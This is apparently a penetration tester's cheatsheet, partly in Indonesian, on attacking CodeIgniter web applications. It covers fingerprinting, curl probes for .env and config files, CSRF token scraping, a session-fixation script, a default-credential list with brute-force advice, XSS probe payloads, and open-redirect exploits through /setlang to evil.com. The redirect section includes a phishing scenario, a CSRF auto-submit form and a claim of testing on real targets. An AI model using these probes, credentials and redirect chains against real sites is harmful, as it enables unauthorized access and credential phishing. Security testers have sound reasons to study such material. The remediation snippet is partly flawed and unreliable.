# CODEIGNITER CHEATSHEET

# CodeIgniter 4 Attack Surface & Fingerprinting

## Fingerprinting

| Indicator | Value |
|---|---|
| Session Cookie | `ci_session=<hash>` (HttpOnly, Secure, SameSite=Lax) |
| Header | `X-Powered-By: PHP/x.x.x` |
| Header | `expires: Thu, 19 Nov 1981 08:52:00 GMT` |
| Header | `cache-control: no-store, no-cache, must-revalidate` |
| robots.txt | Disallow: `/app/`, `/system/`, `/writable/`, `/vendor/`, `/tests/` |

## Attack Surface

### writable/ Directory
```
/writable/logs/        → Application logs (potentially sensitive)
/writable/cache/       → Cache files
/writable/session/     → Session files
/writable/uploads/     → Upload directory
/writable/debugbar/    → Debug toolbar (if enabled)
```

### app/ Directory
```
/app/Config/           → Configuration files
/app/Controllers/      → Controller logic
/app/Models/           → Database models
/app/Views/            → Template files
```

### Known Vulnerabilities
- CI4 has had path traversal in file upload
- Debug mode can expose sensitive info
- Weak CSP configurations common

### Testing Commands
```bash
# Check debug mode
curl -s "https://<TARGET>/index.php?XDEBUG_SESSION_START=1"

# Check writable access
curl -s -o /dev/null -w "%{http_code}" "https://<TARGET>/writable/logs/"

# Check exposed config
curl -s "https://<TARGET>/app/Config/Database.php"
curl -s "https://<TARGET>/.env"

# Check composer.lock for dependency versions
curl -s "https://<TARGET>/composer.lock" | head -20
```

# CodeIgniter Framework — Testing Reference

## Identification

| Indicator | Value |
|-----------|-------|
| Session cookie | `ci_session` |
| CSRF token field | `csrf_test_name` (most reliable — appears in every form) |
| CSRF meta tag | `<meta name="csrf-token" content="...">` |
| Error keys | `validation.*` pattern in JSON errors (e.g., `validation.name.alpha_numeric_space`) |
| Login endpoint | `/login/process` (POST) |
| Contact endpoint | `/contact/send` (POST) |
| Language switch | `/setlang` (POST) |
| Admin panel | `/admin/` (usually redirects to `/login`) |

## Version Detection

- CI3: `ci_session` cookie, `CI_` prefix in error pages
- CI4: `ci_session` cookie, `App` namespace in errors, `.env` file at root

## CSRF Protection

CodeIgniter uses per-session CSRF tokens. Fresh token required for each form submission.

```python
# Extract CSRF token
import re, requests
s = requests.Session()
r = s.get("https://target/login", timeout=10)
csrf = re.search(r'csrf_test_name.*?value="([^"]+)"', r.text).group(1)
```

**Pitfall:** Tokens may rotate on each page load. Always fetch fresh token before each POST.

## Common Validation Rules

| Field Type | CI Rule | Bypass Notes |
|------------|---------|--------------|
| Name | `alpha_numeric_space` | Blocks `<>\"'` and special chars |
| Email | `valid_email` | Standard email regex |
| Phone | `numeric` or `regex_match` | Digits only |
| Text / Textarea | `required` | May allow HTML (test for stored XSS) |

**Validation Fingerprinting Technique:** Test each field individually with `<img src=x onerror=alert(1)>` to identify which fields have strict vs. loose validation:
- Fields returning `validation.*.alpha_numeric_space` → strict, skip
- Fields returning `validation.*.valid_email` → strict, skip
- Fields returning `{success: true}` → injectable, use as XSS target

## SQL Injection Resistance

CodeIgniter's Query Builder uses parameterized queries by default:
```php
$db->where('username', $input)->get('users');
// Becomes: SELECT * FROM users WHERE username = ?
```

**Still test for:**
- Raw `$db->query("... $input ...")` (developer mistakes)
- LIKE clauses without escaping: `$db->like('name', $input)`
- Order-by injection: `$db->orderBy($input, 'ASC')`
- Column/table name injection (not parameterized)

## Session Security Config

```php
// app/Config/Cookie.php (CI4)
public bool $httponly = true;   // Should be true
public bool $secure = true;     // Should be true
public string $samesite = 'Lax'; // Should be Lax or Strict
```

```php
// application/config/config.php (CI3)
$config['cookie_httponly'] = TRUE;
$config['cookie_secure'] = TRUE;
$config['cookie_samesite'] = 'Lax';
```

**Session Fixation (common CI4 issue):**
Many CI4 deployments do NOT call `session()->regenerate()` after login. Test with:
```bash
curl -c c.txt https://target/login
INITIAL=$(grep ci_session c.txt | awk '{print $NF}')
CSRF=$(curl -s -b c.txt https://target/login | grep -oP 'csrf_test_name.*?value="\K[^"]+')
curl -s -b c.txt -c c2.txt -X POST https://target/login/process \
  -d "csrf_test_name=$CSRF&username=USER&password=PASS" > /dev/null
AFTER=$(grep ci_session c2.txt | awk '{print $NF}')
[ "$INITIAL" = "$AFTER" ] && echo "VULNERABLE: Session fixation" || echo "OK: Session regenerated"
```

**Fix (for remediation reports):**
```php
// In login controller, after successful authentication:
session()->regenerate();
```

## Common Paths

```
/admin/                    # Admin panel
/admin/dashboard           # Main dashboard
/admin/user                # User management (CRUD)
/admin/category            # Content categories
/admin/portfolio           # Portfolio items
/admin/equipment           # Equipment/products
/admin/setting             # Website settings (exposes contacts, social media, embeds)
/admin/translation         # Translation management
/admin/language            # Language settings
/login                     # Login page
/login/process             # Login handler (POST)
/contact/send              # Contact form handler
/setlang                   # Language switcher (POST, no CSRF protection)
/writable/                 # Logs, cache, sessions
/writable/debugbar/        # Debug bar data (if enabled)
/writable/logs/            # Error logs
/vendor/                   # Composer dependencies
/app/                      # Application code
/system/                   # CI framework core
/uploads/                  # User uploads
```

## Default Credentials Pattern (Hostinger/CI Deployments)

Hostinger-hosted CodeIgniter sites frequently have multiple default accounts. Always test 6+ credentials — CI login pages rarely have brute force protection.

| Username | Password | Notes |
|----------|----------|-------|
| `admin` | `admin123` | Most common |
| `administrator` | `admin` | Windows-style |
| `root` | `root` | Linux-style |
| `test` | `test` | Dev account |
| `[brand]` | `[brand]` | e.g., `esddev:esddev` |
| `[brand_short]` | `[brand_short]123` | e.g., `esd:esd123` |

## Settings Page — Information Disclosure

Admin settings page (`/admin/setting`) typically exposes:
- WhatsApp number, email, phone
- Full office + warehouse addresses
- Google Maps embed (iframe — potential injection point if accepts raw HTML)
- Social media URLs (Instagram, Twitter/X, Tokopedia, etc.)
- Logo text, company name

## Language Switch — Open Redirect & CSRF Gap

`/setlang` endpoint is a HIGH-VALUE target. In many CI4 deployments it:
- Lacks CSRF protection (no `csrf_test_name` required)
- Accepts a `redirect` parameter with NO domain validation
- Redirects to ANY external URL via `Location` header (303)

**Confirmed attack vectors (tested on real targets):**

1. **Direct external redirect:**
   ```bash
   curl -sD - -X POST "https://target/setlang" \
     -d "redirect=https://evil.com&csrf_test_name=x&lang=id"
   # → Location: https://evil.com
   ```

2. **Domain impersonation (MOST DANGEROUS):**
   ```bash
   curl -sD - -X POST "https://target/setlang" \
     -d "redirect=https://target.com@evil.com&csrf_test_name=x&lang=id"
   # → Location: https://target.com@evil.com
   # Browser navigates to evil.com but URL LOOKS like target.com
   ```

3. **HTTP Parameter Pollution:**
   ```bash
   curl -sD - -X POST "https://target/setlang" \
     -d "redirect=https://target.com/contact&redirect=https://evil.com&csrf_test_name=x&lang=id"
   # → Location: https://evil.com (second param wins)
   # Bypasses validation that only checks first param
   ```

4. **CRLF Injection attempt:**
   ```bash
   # May cause 500 error (server partially processes CRLF)
   curl -sD - -X POST "https://target/setlang" \
     -d "redirect=https://target%0d%0aInjected:%20test&csrf_test_name=x&lang=id"
   ```

**Severity:** Critical — enables phishing on the legitimate domain.

## Debug Mode Indicators

If debug mode is enabled, look for:
- Detailed error pages with stack traces
- `/writable/debugbar/` accessible
- CI Debug Toolbar in responses
- Database queries exposed in HTML comments

# CodeIgniter /setlang Open Redirect Pattern

## Overview

Banyak aplikasi CodeIgniter (terutama yang multi-language) memiliki endpoint `/setlang` untuk mengubah bahasa. Endpoint ini sering vulnerable terhadap Open Redirect karena parameter `redirect` tidak divalidasi.

## Detection

```bash
# Cari form setlang di halaman
curl -s https://target.com | grep -i "setlang"
# Atau di browser:
# document.querySelectorAll('form[action*="setlang"]')
```

## Ciri-ciri

```html
<form action="https://target.com/setlang" method="post">
  <input type="hidden" name="csrf_test_name" value="[64-char-hex]">
  <input type="hidden" name="redirect" value="https://target.com/current-page">
</form>
```

**Key indicators:**
- Endpoint: `/setlang` (POST)
- Parameters: `csrf_test_name` (CSRF token), `redirect` (redirect URL)
- Framework: CodeIgniter 4 (ci_session cookie)
- Multiple forms on same page (one per language option)

## Attack Vector

### 1. Direct Open Redirect

```bash
# Submit form dengan external URL
curl -X POST "https://target.com/setlang" \
  -d "csrf_test_name=VALID_TOKEN&redirect=https://evil.com/phishing" \
  -b "ci_session=VALID_SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

### 2. Phishing Attack

```
1. Attacker crafts link: https://target.com/setlang?redirect=https://evil.com/login
2. Victim clicks link (looks like legitimate target.com URL)
3. Victim redirected to evil.com/login (fake login page)
4. Victim enters credentials → stolen
```

### 3. CSRF + Open Redirect Combo

```html

<form action="https://target.com/setlang" method="post" id="evil">
  <input type="hidden" name="csrf_test_name" value="stolen_or_guessed">
  <input type="hidden" name="redirect" value="https://evil.com/steal">
</form>
<script>document.getElementById('evil').submit();</script>
```

## Exploitation Steps

### Step 1: Get Valid CSRF Token

```javascript
// Di browser console (setelah bypass HCDN challenge):
const form = document.querySelector('form[action*="setlang"]');
const csrf = form.querySelector('input[name="csrf_test_name"]').value;
console.log('CSRF Token:', csrf);
```

### Step 2: Test Open Redirect

```javascript
// Test dengan external URL
fetch('/setlang', {
  method: 'POST',
  body: new URLSearchParams({
    'csrf_test_name': csrf,
    'redirect': 'https://evil.com/test'
  }),
  redirect: 'manual' // Don't follow redirect
}).then(r => {
  console.log('Status:', r.status);
  console.log('Location:', r.headers.get('location'));
});
```

### Step 3: Verify Redirect

```bash
# Jika response 302 dengan Location: https://evil.com/test
# = OPEN REDIRECT CONFIRMED
```

## Impact

- **Phishing**: Redirect users to fake login pages
- **Credential Theft**: Steal credentials via fake forms
- **Malware Distribution**: Redirect to exploit kits
- **CSRF Amplification**: Combine with CSRF for automated attacks

## CVSS Score

- **Base**: 5.4 (Medium)
- **With Phishing**: 6.1 (Medium-High)

## Remediation

```php
// CodeIgniter 4 - Validate redirect URL
public function setlang()
{
    $redirect = $this->request->getPost('redirect');
    
    // Only allow same-origin redirects
    $parsed = parse_url($redirect);
    if ($parsed['host'] !== null && $parsed['host'] !== $this->request->getServer('HTTP_HOST')) {
        $redirect = '/'; // Default to home
    }
    
    // Or use whitelist
    $allowed = ['/', '/home', '/contact', '/portofolio'];
    if (!in_array($redirect, $allowed)) {
        $redirect = '/';
    }
    
    return redirect()->to($redirect);
}
```

## Related Findings

- **Information Disclosure**: Contact page exposes phone, email, addresses
- **Missing Rate Limiting**: Contact form has no rate limiting
- **User Directory Enumeration**: /~username patterns return 301

## References

- CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
- OWASP: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html